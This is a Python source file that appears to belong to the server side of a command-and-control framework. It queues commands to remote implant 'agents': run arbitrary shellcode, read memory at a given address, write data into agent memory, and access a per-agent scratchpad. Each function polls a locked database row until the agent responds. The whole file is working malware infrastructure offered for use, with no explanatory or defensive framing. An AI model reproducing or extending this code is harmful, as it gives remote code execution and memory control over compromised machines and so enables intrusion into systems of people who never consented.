from models.request import Request
from models.agent import Agent
from routes.anon.agent import handle_msg_type
import time

def send_and_wait(agent_id, shellcode):
    shell_len = len(shellcode).to_bytes(8, byteorder="little")
    shellcode = bytearray(shell_len + shellcode) # Shellcode size
    shellcode.insert(0, 0x01) # Exec
    req_obj = Request(agent_id, shellcode)
    while True:
        db_session, request_obj = Request.by_id_lock(req_obj.id)
        if request_obj is None:
            break
        if request_obj.response != None:
            break
        db_session.remove()
    response_data = handle_msg_type(request_obj.id)
    return response_data

def read_from_agent(agent_id, memory, size):
    memory_bytes = bytearray(memory.to_bytes(8, byteorder="little"))
    length_bytes = bytearray(size.to_bytes(8, byteorder="little"))
    data_blob = memory_bytes + length_bytes
    data_blob.insert(0, 0x2) # Read
    req_obj = Request(agent_id, data_blob)
    while True:
        db_session, request_obj = Request.by_id_lock(req_obj.id)
        if request_obj is None:
            break
        if request_obj.response != None:
            break
        db_session.remove()
    response_data = handle_msg_type(request_obj.id)
    return response_data

def read_scratchpad(agent_id, size):
    agent_obj = Agent.by_id(agent_id)
    return read_from_agent(agent_id, agent_obj.scratchpad, size)



def write_to_agent(agent_id, memory, data):
    memory_bytes = bytearray(memory.to_bytes(8, byteorder="little"))
    length_bytes = bytearray(len(data).to_bytes(8, byteorder="little"))
    data_blob = memory_bytes + length_bytes + data
    data_blob.insert(0, 0x3) # Write
    req_obj = Request(agent_id, data_blob)
    while True:
        db_session, request_obj = Request.by_id_lock(req_obj.id)
        if request_obj is None:
            break
        if request_obj.response != None:
            break
        db_session.remove()
    return handle_msg_type(request_obj.id)

def write_scratchpad(agent_id, data):
    agent_obj = Agent.by_id(agent_id)
    return write_to_agent(agent_id, agent_obj.scratchpad, data)